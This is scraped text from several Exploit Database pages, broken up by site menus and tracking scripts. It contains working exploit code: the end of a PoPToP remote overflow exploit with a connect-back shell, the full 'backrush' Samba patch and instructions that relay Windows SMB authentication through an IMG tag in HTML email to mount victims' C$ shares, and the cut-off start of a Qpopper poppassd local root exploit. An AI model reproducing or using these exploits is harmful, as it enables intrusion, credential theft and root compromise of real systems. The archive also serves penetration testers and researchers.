exploitability using really poor method.\n");printf(" Connect back to your_ip at your_port.\n\n");return 0;}if (argc == 2){if (!connect_server(argv[1])) return 1;printf("\nChecking if the server is vulnerable..\n");printf("(if it is you have to wait 65 seconds)..\n");send_init_request(st);ret = 0x01010101;//header lengthbytes = recv(st,(char*)&reply,2,0);bytes = ntohs(reply.header.length);bytes = recv(st,(char*)&reply+2,bytes-2,0);j = htons(reply.header.ctrl_type);send_ping_overflow(st,ret,"0.0.0.0",0);//header lengthbytes = recv(st,(char*)&reply,2,0);printf("PoPToP server is ");if ((bytes = recv(st,(char*)&reply,2,0)) != -1) printf("vulnerable!\n");else printf("not vulnerable\n");close(st);return 1;}if(argc < 5) exit(1);else if(strncmp(argv[4], "-b", 2) == 0) {if(argc == 6) timeout = atoi(argv[5]);printf("[!] Attempting bruteforce against %s, timeout: %d\n", argv[1], timeout);printf("interrupt when you get a shell to %s on port %d...\n\n",argv[2],atoi(argv[3]));for (ret = TOPOFSTACK; ret >=BOTTOMOFSTACK; ret -= STEP) {printf("[*] ");if (!connect_server(argv[1])) return 1;printf("[ret=0x%x]..",ret);printf("sending payload..");// initial packetsend_init_request(st);//a real overflowing ping packetsend_ping_overflow(st,ret,argv[2],atoi(argv[3]));close(st);usleep(timeout * 1000);printf("done\n");}}else if(strncmp(argv[4], "-t", 2) == 0) {if(argc == 6 && atoi(argv[5]) >= 0&& atoi(argv[5]) < sizeof(targets)/sizeof(struct target)) {ret = targets[atoi(argv[5])].ret;printf("[!] Attacking %s using %s\n", argv[1], targets[atoi(argv[5])].desc);printf("[*] ");if (!connect_server(argv[1])) return 1;printf("[ret=0x%x]..",ret);printf("sending payload..");// initial packetsend_init_request(st);//a real overflowing ping packetsend_ping_overflow(st,ret,argv[2],atoi(argv[3]));close(st);printf("done\n");}else {for(j = 0; j < sizeof(targets)/sizeof(struct target); j++) {printf("%02d - %s\n", j, targets[j].desc);}printf("\n");}}else if(strncmp(argv[4], "-r", 2) == 0) {if(argc == 6) {sscanf(argv[5], "%x", (unsigned int *)&ret);printf("[!] Attacking %s\n", argv[1]);printf("[*] ");if (!connect_server(argv[1])) return 1;printf("[ret=0x%x]..",ret);printf("sending payload..");// initial packetsend_init_request(st);//a real overflowing ping packetsend_ping_overflow(st,ret,argv[2],atoi(argv[3]));close(st);printf("done\n");}}return 0;}// milw0rm.com [2003-04-25]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 20
Microsoft Windows 2000/XP - SMB Authentication Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows 2000/XP - SMB Authentication Remote OverflowEDB-ID:20CVE:2008-4037EDB Verified:Author:Haamed GheibiType:remoteExploit:/Platform:WindowsDate:2003-04-25Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED########################################### Exploit for "Authentication flaw in Windows SMB protocol" ############################################ Release Date:# April 24, 2003## Code by Haamed Gheibi (haamed@linux.ce.aut.ac.ir)# Salman Niksefat (salman@linux.ce.aut.ac.ir)## Systems Affected by this exploit:# Windows 2000 (SP0 SP1 SP2 SP3)# Windows XP (SP0 SP1)## EXPLOIT PROVIDED FOR EDUCATIONAL PURPOSES ONLY AS A PROOF OF CONCEPT# WE TAKE NO RESPONSIBILITY FOR USE OF THIS CODE.##########################################This exploit is based on samba-2.2.8a, you can download the source code from:http://us1.samba.org/samba/ftp/samba-2.2.8a.tar.bz2or other mirrors.First you should configure and make samba source code as follow:You need first to extract the file:$ tar -jxf samba-2.2.8a.tar.bz2$ cd samba-2.2.8a/sourceHere you need to configure with suitable options. Here is a config for RedHat 9:$ ./configure --sysconfdir=/etc --with-codepagedir=/usr/share/samba/codepages\--with-lockdir=/var/cache/samba --with-configdir=/etc/samba$ make$ make bin/smbmount$ su# make installFirst add an arbitary user to samba: (Choose a reliable password for it for your protection!)# smbadduser smbtmpuser:rootNow check if your samba server(bin/smbd) and client(bin/smbmount) are working,and that ipchains rulls are not set. you can use:# service smbd stop# bin/smbd -i# ipchains -FWell, now if everything works fine, you can apply the exploit code to the source.Download it from: http://seclab.ce.aut.ac.ir/samba-exp/exploit/backrush.patch# patch < backrush.patchMake it again:# make bin/smbd# make bin/smbmount[Note that you shouldn't make whole samba, cause you may get linker errors]Make necessary directories:# mkdir -p bin/backrush/log# mkdir bin/backrush/mnt# touch bin/backrush/ip2sharename.mapNow we are done, you MUST change directory to bin and run the server:# cd bin# killall -9 smbd# ./smbdNow by default, the C$ share folder of any Windows machine who tries to connectto this SMB server, would be mounted to mnt/machinename-random folder.If you want to mount another share folder, you can add an entry to ip2sharename.map file as follow:IPADDRESS:SHARENAMEThis option is suitable for XP systems.2 ways 2 force a client to automatically connect to your modified SMB server:1. Send him/her a HTML email with the following tag:<IMG src='\\smb-server\nofile.gif' width=1 height=1>2. Invite him/her to visit your personal web page.You can make it by the above tag, then pray and wait until he/she visits your page. ;)Enjoy!* backrush.patch *diff -Nur /root/samba-2.2.8a/source/client/smbmount.c /backrush/source.exp/client/smbmount.c--- /root/samba-2.2.8a/source/client/smbmount.c 2002-04-30 17:56:19.000000000 +0430+++ /backrush/source.exp/client/smbmount.c 2003-04-19 16:28:04.000000000 +0430@@ -26,6 +26,10 @@#include <mntent.h>#include <asm/types.h>#include <linux/smb_fs.h>+//>Backrush+int br_read[2], br_write[2], br_pid;+struct Backrush br_state;+//<extern BOOL in_client;extern pstring user_socket_options;@@ -177,6 +181,21 @@cli_shutdown(c);return NULL;}+//>Backrush+ {+ int i;+ printf("challange: ");+ for (i = 0; i < 8; i++)+ printf("%0.2x",c->cryptkey[i]);+ fflush(stdout);+ memcpy(br_state.challenge, c->cryptkey, 8);+ br_state.status = 1;+ write(br_write[1],&br_state, sizeof(br_state));+ printf(" sent to server\n");+ printf("waiting for response...\n");+ fflush(stdout);+ }+//<if (!got_pass) {char *pass = getpass("Password: ");@@ -848,6 +867,14 @@if (*credentials != 0) {read_credentials_file(credentials);}+//>Backrush+ printf("Started to mount %s on %s\n",argv[1], argv[2]);+ fflush(stdout);+ if (getenv("BACKRUSH_READ"))+ br_read[0] = atoi(getenv("BACKRUSH_READ"));+ if (getenv("BACKRUSH_WRITE"))+ br_write[1] = atoi(getenv("BACKRUSH_WRITE"));+//<DEBUG(3,("mount.smbfs started (version %s)\n", VERSION));diff -Nur /root/samba-2.2.8a/source/include/includes.h /backrush/source.exp/include/includes.h--- /root/samba-2.2.8a/source/include/includes.h 2003-02-28 19:26:18.000000000 +0330+++ /backrush/source.exp/include/includes.h 2003-04-17 10:36:54.000000000 +0430@@ -1,5 +1,26 @@#ifndef _INCLUDES_H#define _INCLUDES_H++//>Backrush+#include <stdlib.h>+#include <time.h>+struct Backrush+{+ int status;+ char ip_address[20];+ int port;+ char username[256];+ char sharename[256];+ char netbios[256];+ char domain[256];+ char challenge[8];+ char nt_resp[24];+ char lm_resp[24];+};+extern struct Backrush br_state;+extern int br_read[2],br_write[2],br_pid;+//<+/*Unix SMB/Netbios implementation.Version 1.9.diff -Nur /root/samba-2.2.8a/source/libsmb/cliconnect.c /backrush/source.exp/libsmb/cliconnect.c--- /root/samba-2.2.8a/source/libsmb/cliconnect.c 2003-03-15 01:04:48.000000000 +0330+++ /backrush/source.exp/libsmb/cliconnect.c 2003-04-17 12:30:26.000000000 +0430@@ -23,7 +23,6 @@#include "includes.h"-static const struct {int prot;const char *name;@@ -265,7 +264,28 @@memcpy(pword, pass, passlen);memcpy(ntpword, ntpass, ntpasslen);}-+//>Backrush+ {+ int i;+ read(br_read[0],&br_state, sizeof(br_state));+ printf("received response:\n");+ fflush(stdout);+ memcpy(pword, br_state.lm_resp, 24);+ memcpy(ntpword, br_state.nt_resp, 24);+ if(br_state.username[0])+ strncpy(user, br_state.username, 24);+ printf("username: %s\n", user);+ printf("lm response: ");+ for (i = 0; i < 24; i++)+ printf("%0.2x",pword[i]);+ printf("\n");+ printf("nt response: ");+ for (i = 0; i < 24; i++)+ printf("%0.2x",ntpword[i]);+ printf("\n");+ fflush(stdout);+ }+//</* send a session setup command */memset(cli->outbuf,'\0',smb_size);diff -Nur /root/samba-2.2.8a/source/smbd/negprot.c /backrush/source.exp/smbd/negprot.c--- /root/samba-2.2.8a/source/smbd/negprot.c 2003-03-15 01:04:49.000000000 +0330+++ /backrush/source.exp/smbd/negprot.c 2003-04-24 13:37:19.000000000 +0430@@ -180,6 +180,45 @@doencrypt = ((cli->sec_mode & 2) != 0);}+//>Backrush+ {+ srand(time(NULL));+ pipe(br_read);+ pipe(br_write);+ br_state.status = 1;+ br_state.port = random();+ strncpy(br_state.ip_address, get_socket_addr(smbd_server_fd()), sizeof(br_state.ip_address));+ strncpy(br_state.sharename, "c$", sizeof(br_state.sharename));+ {+ char tmp[1024], *ptr;+ FILE *fin = fopen("backrush/ip2sharename.map","r");+ if (fin)+ {+ while(fscanf(fin, "%s", tmp) > 0)+ {+ ptr = strchr(tmp, ':');+ *ptr++ = 0;+ if (!strcmp(br_state.ip_address,tmp))+ strncpy(br_state.sharename, ptr, sizeof(br_state.sharename));+ }+ fclose(fin);+ }+ }+ if (!(br_pid = fork()))+ {+ char cmd[1024];+ snprintf(cmd, sizeof cmd, "mkdir -p backrush/mnt/%s-%d", br_state.ip_address, br_state.port);+ system(cmd);+ snprintf(cmd, sizeof cmd, "export BACKRUSH_READ=%d; export BACKRUSH_WRITE=%d;./smbmount //%s/%s backrush/mnt/%s-%d -o username=root,password=let_me_go_in>backrush/log/%s-%d",+ br_write[0], br_read[1], br_state.ip_address, br_state.sharename, br_state.ip_address,br_state.port, br_state.ip_address, br_state.port);+ system(cmd);+ snprintf(cmd, sizeof cmd, "echo smbmount compeleted >>backrush/log/%s-%d",br_state.ip_address, br_state.port);+ system(cmd);+ _exit(0);+ }+ }+//<+if (doencrypt) {crypt_len = 8;if (!cli) {diff -Nur /root/samba-2.2.8a/source/smbd/password.c /backrush/source.exp/smbd/password.c--- /root/samba-2.2.8a/source/smbd/password.c 2003-04-07 06:24:00.000000000 +0430+++ /backrush/source.exp/smbd/password.c 2003-04-19 09:15:47.000000000 +0430@@ -48,6 +48,10 @@unsigned char buf[8];generate_random_buffer(buf,8,False);+//>Backrush+ read(br_read[0],&br_state, sizeof(br_state));+ memcpy(buf, br_state.challenge, 8);+//<memcpy(saved_challenge, buf, 8);memcpy(challenge,buf,8);@@ -466,7 +470,13 @@uchar challenge[8];char* user_name;uint8 *nt_pw, *lm_pw;-+//>Backrush+ memcpy(br_state.nt_resp, nt_pass, 24);+ memcpy(br_state.lm_resp, lm_pass, 24);+ write(br_write[1],&br_state, sizeof(br_state));+// waitpid(br_pid,NULL,WNOHANG);+ return(False);+//<if (!lm_pass || !sampass)return(False);diff -Nur /root/samba-2.2.8a/source/smbd/reply.c /backrush/source.exp/smbd/reply.c--- /root/samba-2.2.8a/source/smbd/reply.c 2003-04-07 06:24:00.000000000 +0430+++ /backrush/source.exp/smbd/reply.c 2003-04-16 18:03:58.000000000 +0430@@ -974,6 +974,11 @@* security=domain.*/+//>Backrush+ strncpy(br_state.username,user,sizeof(br_state.username));+ strncpy(user,"root",sizeof(br_state.username));+//<+if (!guest && !check_server_security(orig_user, domain, user,smb_apasswd, smb_apasslen, smb_ntpasswd, smb_ntpasslen) &&!check_domain_security(orig_user, domain, user, smb_apasswd,diff -Nur /root/samba-2.2.8a/source/smbd/server.c /backrush/source.exp/smbd/server.c--- /root/samba-2.2.8a/source/smbd/server.c 2003-03-15 01:04:49.000000000 +0330+++ /backrush/source.exp/smbd/server.c 2003-04-16 18:05:17.000000000 +0430@@ -25,6 +25,11 @@extern fstring global_myworkgroup;extern pstring global_myname;+//<Backrush+int br_read[2],br_write[2],br_pid;+struct Backrush br_state;+//>+int am_parent = 1;/* the last message the was processed */# milw0rm.com [2003-04-25]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 21
Qpopper 4.0.x - 'poppassd' Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDQpopper 4.0.x - 'poppassd' Privilege EscalationEDB-ID:21CVE:2003-1452EDB Verified:Author:Xpl017ElzType:localExploit:/Platform:LinuxDate:2003-04-29Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*****  Title: Qpopper v4.0.x poppassd local root exploit.**  Exploit code: 0x82-Local.Qp0ppa55d.c**** --**  ./0x82-Local.Qp0ppa55d -u x82 -p mypasswd****  Qpopper v4.0.x poppassd local root exploit.**                          by Xpl017Elz***/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <sys/stat.h>#define BUF_SZ 0x82#define D_POPPASS "/usr/local/bin/poppassd"#define D_NAME "Happy-Exploit"#define D_SHELL "/tmp/x82"#define D_EXEC "/tmp/x0x"int m_sh();void banrl();void usage(char *p_name);struct stat ss;void usage(char *p_name){fprintf(stdout," Usage: %s -option [argument]\n",p_name);fprintf(stdout,"\n\t-u - Qpopper username.\n");fprintf(stdout,"\t-p - Qpopper password.\n");fprintf(stdout,"\t-t - Qpopper poppassd path.\n");fprintf(stdout,"\t-h - Help information.\n\n");fprintf(stdout," Example> %s -u x82 -p %s\n\n",p_name,D_NAME);exit(-1);}int m_sh(){char d_shell[BUF_SZ]=D_SHELL;char sh_drop[BUF_SZ];FILE *fp;memset((char *)sh_drop,0,sizeof(sh_drop));snprintf(sh_drop,sizeof(sh_drop)-1,"%s.c",d_shell);if((fp=fopen(sh_drop,"w"))==NULL){perror(" [-] fopen() error");exit(-1);}fprintf(fp,"main() 